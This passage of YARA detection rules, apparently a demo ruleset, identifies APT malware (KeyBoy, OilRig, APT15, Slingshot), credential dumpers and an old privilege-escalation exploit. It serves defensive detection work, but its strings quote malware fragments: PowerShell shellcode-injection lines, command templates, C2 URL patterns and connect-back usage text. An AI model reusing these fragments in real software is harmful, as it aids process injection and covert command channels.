DEMO, EXE, EXPLOIT, FILE, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Created a new cmd.exe process\" fullword ascii\n      $x2 = \"[+] Modified shellcode\" fullword ascii\n      $x3 = \"[*] Spawning SYSTEM shell...\" fullword ascii\n      $x4 = \"[*] MS14-070 (CVE-2014-4076) x86\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule PowerShell_JAB_B64_RID2D4D : DEMO FILE SCRIPT SUSP T1059_001 T1132_001 {\n   meta:\n      description = \"Detects base464 encoded $ sign at the beginning of a string\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/980915287922040832\"\n      date = \"2018-04-02 10:26:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-01-14\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP, T1059_001, T1132_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"('JAB\" ascii wide\n      $s2 = \"powershell\" nocase\n   condition: \n      filesize < 30KB and all of them\n}\n\nrule SUSP_PowerShell_String_K32_RemProcess_RID3507 : DEMO FILE SCRIPT SUSP T1059 T1059_001 {\n   meta:\n      description = \"Detects suspicious PowerShell code that uses Kernel32, RemoteProccess handles or shellcode\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nccgroup/redsnarf\"\n      date = \"2018-03-31 15:55:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash3 = \"54a8dd78ec4798cf034c7765d8b2adfada59ac34d019e77af36dcaed1db18912\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Throw \\\"Unable to allocate memory in the remote process for shellcode\\\"\" fullword ascii\n      $x2 = \"$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\\\"kernel32.dll\\\")\" fullword ascii\n      $s3 = \"$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.\" ascii\n      $s7 = \"if ($RemoteProcHandle -eq [IntPtr]::Zero)\" fullword ascii\n      $s8 = \"if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\" fullword ascii\n      $s9 = \"$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, \" ascii\n      $s15 = \"$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 6000KB and 1 of them\n}\n\nrule KeyBoy_InstallClient_RID2EF9 : APT DEMO EXE FILE G0081 T1197 T1218_011 {\n   meta:\n      description = \"Detects KeyBoy InstallClient\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 11:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"85d32cb3ae046a38254b953a00b37bb87047ec435edb0ce359a867447ee30f8b\"\n      hash2 = \"b0f120b11f727f197353bc2c98d606ed08a06f14a1c012d3db6fe0a812df528a\"\n      hash1 = \"85d32cb3ae046a38254b953a00b37bb87047ec435edb0ce359a867447ee30f8b\"\n      tags = \"APT, DEMO, EXE, FILE, G0081, T1197, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"egsvr32.exe \\\"/u bitsadmin /canceft\\\\windows\\\\currebitsadmin\" ascii\n      $x2 = \"/addfibitsadmin /Resumbitsadmin /SetNosoftware\\\\microsotifyCmdLine \" ascii\n      $x3 = \"D:\\\\Work\\\\Project\\\\VS\\\\house\\\\Apple\\\\\" ascii\n      $x4 = \"Bj+I11T6z9HFMG5Z5FMT/u62z9zw8FyWV0xrcK7HcYXkiqnAy5tc/iJuKtwM8CT3sFNuQu8xDZQGSR6D8/Bc/Dpuz8gMJFz+IrYqNAzwuPIitg==\" fullword ascii\n      $x5 = \"szCmd1:%s\" fullword ascii\n      $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n      $s4 = \"rundll32.exe %s Main\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule KeyBoy_wab32res_RID2CAC : APT DEMO EXE FILE G0081 T1197 {\n   meta:\n      description = \"Detects KeyBoy Loader wab32res.dll\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 09:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"02281e26e89b61d84e2df66a0eeb729c5babd94607b1422505cd388843dd5456\"\n      hash2 = \"fb9c9cbf6925de8c7b6ce8e7a8d5290e628be0b82a58f3e968426c0f734f38f6\"\n      tags = \"APT, DEMO, EXE, FILE, G0081, T1197\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"B4490-2314-55C1- /Processid:{321bitsadmin /canceft\\\\windows\\\\curresoftware\\\\microso\" fullword ascii\n      $x2 = \"D:\\\\Work\\\\VS\\\\House\\\\TSSL\\\\TSSL\\\\TClient\" ascii\n      $x3 = \"\\\\Release\\\\FakeRun.pdb\" ascii\n      $x4 = \"FakeRun.dll\" fullword ascii\n      $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n      $s2 = \"CreateProcess failed (%d)\" fullword ascii\n      $s3 = \"CreateProcess %s \" fullword ascii\n      $s4 = \"FindResource %s error \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule KeyBoy_rasauto_RID2CC2 : APT DEMO EXE FILE G0081 T1218_011 {\n   meta:\n      description = \"Detects KeyBoy ServiceClient\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 10:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"49df4fec76a0ffaee5e4d933a734126c1a7b32d1c9cb5ab22a868e8bfc653245\"\n      tags = \"APT, DEMO, EXE, FILE, G0081, T1218_011\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $x1 = \"rundll32.exe %s SSSS & exit\" fullword ascii\n      $x2 = \"D:\\\\Work\\\\Project\\\\VS\\\\HSSL\\\\HSSL_Unicode _2\\\\Release\\\\ServiceClient.pdb\" fullword ascii\n      $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n      $s2 = \"CreateProcess failed (%d)\" fullword ascii\n      $s3 = \"ServiceClient.dll\" fullword ascii\n      $s4 = \"NtWow64QueryInformationProcess64 failed\" fullword ascii\n      $s5 = \"pid:%d CmdLine:%S\" fullword ascii\n      $s6 = \"rasauto32.ServiceMain\" fullword ascii\n      $s7 = \"del /q/f %s\\\\%s*\" fullword ascii\n      $s8 = \"szTmpDll:%s\" fullword ascii\n      $s9 = \"lpCmdLine:%s\" fullword ascii\n      $s0 = \"ReleaseFileFromRes:%s ok!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.exports ( \"SSSS\" ) or 1 of ( $x* ) or 4 of them )\n}\n\nrule KeyBoy_876_0x4e20000_RID2CFA : APT DEMO EXE FILE G0081 T1218_011 {\n   meta:\n      description = \"Detects KeyBoy Backdoor\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 10:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6e900e5b6dc4f21a004c5b5908c81f055db0d7026b3c5e105708586f85d3e334\"\n      tags = \"APT, DEMO, EXE, FILE, G0081, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\rundll32.exe %s ServiceTake %s %s\" fullword ascii\n      $x2 = \"#%sCmd shell is not running,or your cmd is error!\" fullword ascii\n      $x3 = \"Take Screen Error,May no user login!\" fullword ascii\n      $x4 = \"Get logon user fail!\" fullword ascii\n      $x5 = \"8. LoginPasswd:%s\" fullword ascii\n      $x6 = \"Take Screen Error,service dll not exists\" fullword ascii\n      $s1 = \"taskkill /f /pid %s\" fullword ascii\n      $s2 = \"TClient.exe\" fullword ascii\n      $s3 = \"%s\\\\wab32res.dll\" fullword ascii\n      $s4 = \"%s\\\\rasauto.dll\" fullword ascii\n      $s5 = \"Download file:%s index:%d\" fullword ascii\n      $s6 = \"LogonUser: [%s]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule Lazagne_PW_Dumper_RID2DA5 : DEMO HKTL T1003 {\n   meta:\n      description = \"Detects Lazagne PW Dumper\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://github.com/AlessandroZ/LaZagne/releases/\"\n      date = \"2018-03-22 10:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Crypto.Hash\" fullword ascii\n      $s2 = \"laZagne\" fullword ascii\n      $s3 = \"impacket.winregistry\" fullword ascii\n   condition: \n      3 of them\n}\n\nrule Chafer_Mimikatz_Custom_RID2FD9 : APT DEMO EXE FILE G0087 MIDDLE_EAST S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects Custom Mimikatz Version\"\n      author = \"Florian Roth, Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9709afeb76532566ee3029ecffc76df970a60813bcac863080cc952ad512b023\"\n      tags = \"APT, DEMO, EXE, FILE, G0087, MIDDLE_EAST, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\win7p\\\\Documents\\\\mi-back\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Chafer_Exploit_Copyright_2017_RID31DF : APT DEMO EXE EXPLOIT FILE G0049 G0087 MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig Internet Server Extension with Copyright (C) 2017 Exploit\"\n      author = \"Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 13:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cdac69caad8891c5e1b8eabe598c869674dee30af448ce4e801a90eb79973c66\"\n      tags = \"APT, DEMO, EXE, EXPLOIT, FILE, G0049, G0087, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"test3 Internet Server Extension\" fullword wide\n      $x2 = \"Copyright (C) 2017 Exploit\" fullword wide\n      $a1 = \"popen() failed!\" fullword ascii\n      $a2 = \"cmd2cmd=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or all of ( $a* ) )\n}\n\nrule Oilrig_Myrtille_RID2D28 : APT DEMO EXE FILE G0049 MIDDLE_EAST T1021_001 {\n   meta:\n      description = \"Detects Oilrig Myrtille RDP Browser\"\n      author = \"Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 10:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"67945f2e65a4a53e2339bd361652c6663fe25060888f18e681418e313d1292ca\"\n      tags = \"APT, DEMO, EXE, FILE, G0049, MIDDLE_EAST, T1021_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Release\\\\Myrtille.Services.pdb\" ascii\n      $x2 = \"Failed to notify rdp client process exit (MyrtilleAppPool down?), remote session {0} ({1})\" fullword wide\n      $x3 = \"Started rdp client process, remote session {0}\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them\n}\n\nrule Chafer_Packed_Mimikatz_RID2FA6 : APT DEMO EXE FILE G0049 G0087 MIDDLE_EAST S0002 T1003 T1027_002 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects Oilrig Packed Mimikatz also detected as Chafer_WSC_x64 by FR\"\n      author = \"Florian Roth, Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 12:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5f2c3b5a08bda50cca6385ba7d84875973843885efebaff6a482a38b3cb23a7c\"\n      tags = \"APT, DEMO, EXE, FILE, G0049, G0087, MIDDLE_EAST, S0002, T1003, T1027_002, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Windows Security Credentials\" fullword wide\n      $s2 = \"Minisoft\" fullword wide\n      $x1 = \"Copyright (c) 2014 - 2015 Minisoft\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( all of ( $s* ) or $x1 )\n}\n\nrule Oilrig_PS_CnC_RID2BCC : APT DEMO G0049 MIDDLE_EAST SCRIPT T1059_001 {\n   meta:\n      description = \"Powershell CnC using DNS queries\"\n      author = \"Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 09:21:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9198c29a26f9c55317b4a7a722bf084036e93a41ba4466cbb61ea23d21289cfa\"\n      tags = \"APT, DEMO, G0049, MIDDLE_EAST, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"(-join $base32filedata[$uploadedCompleteSize..$($uploadedCompleteSize\" fullword ascii\n      $s2 = \"$hostname = \\\"D\\\" + $fileID + (-join ((65..90) + (48..57) + (97..122)|\" ascii\n   condition: \n      filesize < 40KB and 1 of them\n}\n\nrule Impacket_Lateral_Movement_RID310D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Impacket Network Aktivity for Lateral Movement\"\n      author = \"Markus Neis\"\n      reference = \"https://github.com/CoreSecurity/impacket\"\n      date = \"2018-03-22 13:06:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.dcerpc.v5.transport(\" ascii\n      $s2 = \"impacket.smbconnection(\" ascii\n      $s3 = \"impacket.dcerpc.v5.ndr(\" ascii\n      $s4 = \"impacket.spnego(\" ascii\n      $s5 = \"impacket.smb(\" ascii\n      $s6 = \"impacket.ntlm(\" ascii\n      $s7 = \"impacket.nmb(\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and 2 of them\n}\n\nrule TA18_074A_scripts_RID2CB1 : APT DEMO {\n   meta:\n      description = \"Detects malware mentioned in TA18-074A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA18-074A\"\n      date = \"2018-03-16 10:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-08-18\"\n      hash1 = \"2f159b71183a69928ba8f26b76772ec504aefeac71021b012bd006162e133731\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Running -s cmd /c query user on \" ascii\n   condition: \n      filesize < 600KB and 1 of them\n}\n\nrule TA18_074A_screen_RID2C29 : APT DEMO EXE FILE T1113 {\n   meta:\n      description = \"Detects malware mentioned in TA18-074A\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA18-074A\"\n      date = \"2018-03-16 09:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2f159b71183a69928ba8f26b76772ec504aefeac71021b012bd006162e133731\"\n      tags = \"APT, DEMO, EXE, FILE, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"screen.exe\" fullword wide\n      $s2 = \"PlatformInvokeUSER32\" fullword ascii\n      $s3 = \"GetDesktopImageF\" fullword ascii\n      $s4 = \"PlatformInvokeGDI32\" fullword ascii\n      $s5 = \"Too many arguments, going to store in current dir\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 3 of them\n}\n\nrule APT15_Malware_Mar18_RoyalCli_RID30EA : APT DEMO EXE FILE G0004 {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n      date = \"2018-03-10 13:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"6df9b712ff56009810c4000a0ad47e41b7a6183b69416251e060b5c80cd05785\"\n      tags = \"APT, DEMO, EXE, FILE, G0004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\RoyalCli.pdb\" ascii\n      $s2 = \"%snewcmd.exe\" fullword ascii\n      $s3 = \"Run cmd error %d\" fullword ascii\n      $s4 = \"%s~clitemp%08x.ini\" fullword ascii\n      $s5 = \"run file failed\" fullword ascii\n      $s6 = \"Cmd timeout %d\" fullword ascii\n      $s7 = \"2 %s  %d 0 %d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule APT15_Malware_Mar18_RoyalDNS_RID30B7 : APT DEMO EXE FILE G0004 {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n      date = \"2018-03-10 12:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"bc937f6e958b339f6925023bc2af375d669084e9551fd3753e501ef26e36b39d\"\n      tags = \"APT, DEMO, EXE, FILE, G0004\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $x1 = \"del c:\\\\windows\\\\temp\\\\r.exe /f /q\" fullword ascii\n      $x2 = \"%s\\\\r.exe\" fullword ascii\n      $s1 = \"rights.dll\" fullword ascii\n      $s2 = \"\\\"%s\\\">>\\\"%s\\\"\\\\s.txt\" fullword ascii\n      $s3 = \"Nwsapagent\" fullword ascii\n      $s4 = \"%s\\\\r.bat\" fullword ascii\n      $s5 = \"%s\\\\s.txt\" fullword ascii\n      $s6 = \"runexe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( ( pe.exports ( \"RunInstallA\" ) and pe.exports ( \"RunUninstallA\" ) ) or 1 of ( $x* ) or 2 of them )\n}\n\nrule APT15_Malware_Mar18_BS2005_RID2F27 : APT DEMO EXE FILE G0004 {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n      date = \"2018-03-10 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"750d9eecd533f89b8aa13aeab173a1cf813b021b6824bc30e60f5db6fa7b950b\"\n      tags = \"APT, DEMO, EXE, FILE, G0004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"AAAAKQAASCMAABi+AABnhEBj8vep7VRoAEPRWLweGc0/eiDrXGajJXRxbXsTXAcZAABK4QAAPWwAACzWAAByrg==\" fullword ascii\n      $x2 = \"AAAAKQAASCMAABi+AABnhKv3kXJJousn5YzkjGF46eE3G8ZGse4B9uoqJo8Q2oF0AABK4QAAPWwAACzWAAByrg==\" fullword ascii\n      $a1 = \"http://%s/content.html?id=%s\" fullword ascii\n      $a2 = \"http://%s/main.php?ssid=%s\" fullword ascii\n      $a3 = \"http://%s/webmail.php?id=%s\" fullword ascii\n      $a9 = \"http://%s/error.html?tab=%s\" fullword ascii\n      $s1 = \"%s\\\\~tmp.txt\" fullword ascii\n      $s2 = \"%s /C %s >>\\\"%s\\\" 2>&1\" fullword ascii\n      $s3 = \"DisableFirstRunCustomize\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule APT15_Malware_Mar18_MSExchangeTool_RID332C : APT DEMO EXE FILE G0004 {\n   meta:\n      description = \"Detects malware from APT 15 report by NCC Group\"\n      author = \"Florian Roth\"\n      reference = \"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n      date = \"2018-03-10 14:36:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"16b868d1bef6be39f69b4e976595e7bd46b6c0595cf6bc482229dbb9e64f1bce\"\n      tags = \"APT, DEMO, EXE, FILE, G0004\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\EWSTEW.pdb\" ascii\n      $s2 = \"EWSTEW.exe\" fullword wide\n      $s3 = \"Microsoft.Exchange.WebServices.Data\" fullword ascii\n      $s4 = \"tmp.dat\" fullword wide\n      $s6 = \"/v or /t is null\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule Slingshot_APT_Minisling_RID3019 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:25:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"{6D29520B-F138-442e-B29F-A4E7140F33DE}\" fullword ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Slingshot_APT_Spork_Downloader_RID32EC : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 14:25:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: spork -c IP:PORT\" fullword ascii wide\n      $s2 = \"connect-back IP address and port number\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Slingshot_APT_Ring0_Loader_RID30E5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \" -> Missing element in DataDir -- cannot install\" ascii\n      $s2 = \" -> Primary loader not present in the DataDir\" ascii\n      $s3 = \"\\\\\\\\.\\\\amxpci\" fullword ascii\n      $s4 = \" -> [Goad] ERROR in CreateFile:\" fullword ascii\n      $s5 = \"\\\\\\\\.\\\\Sandra\" fullword ascii\n      $s6 = \" -> [Sandra] RingZeroCode\" fullword ascii\n      $s7 = \" -> [Sandra] Value from IOCTL_RDMSR:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Slingshot_APT_Malware_1_RID2FC8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4b250304e28648574b441831bf579b844e8e1fda941fb7f86a7ea7c4291bbca6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"SlingDll.dll\" fullword ascii\n      $s2 = \"BogusDll.\" ascii\n      $s3 = \"smsvcrt -h 0x%p\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( pe.imphash ( ) == \"7ead4bb0d752003ce7c062adb7ffc51a\" or pe.exports ( \"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW0000\" ) or 1 of them )\n}\n\nrule Slingshot_APT_Malware_2_RID2FC9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2a51ef6d115daa648ddd57d1e4480f5a18daf40986bfde32aab19349aa010e67\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\?\\\\c:\\\\RECYCLER\\\\S-1-5-21-2225084468-623340172-1005306204-500\\\\INFO5\" fullword wide\n      $x_slingshot = {09 46 BE 57 42 DD 70 35 5E } \n      $s1 = \"Opening service %s for stop access failed.#\" fullword wide\n      $s2 = \"LanMan setting <%s> is ignored because system has a higher value already.\" fullword wide\n      $s3 = \"\\\\DosDevices\\\\amxpci\" wide\n      $s4 = \"lNTLMqSpPD\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule Slingshot_APT_Malware_3_RID2FCA : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Slingshot APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/apt-slingshot/84312/\"\n      date = \"2018-03-09 12:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fa513c65cded25a7992e2b0ab03c5dd5c6d0fc2282cd64a1e11a387a3341ce18\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $a1 = \"chmhlpr.dll\" fullword ascii\n      $s2 = \"%hc%hc%hc%hc\" fullword ascii\n      $s3 = \"%hc%hc%hc=\" fullword 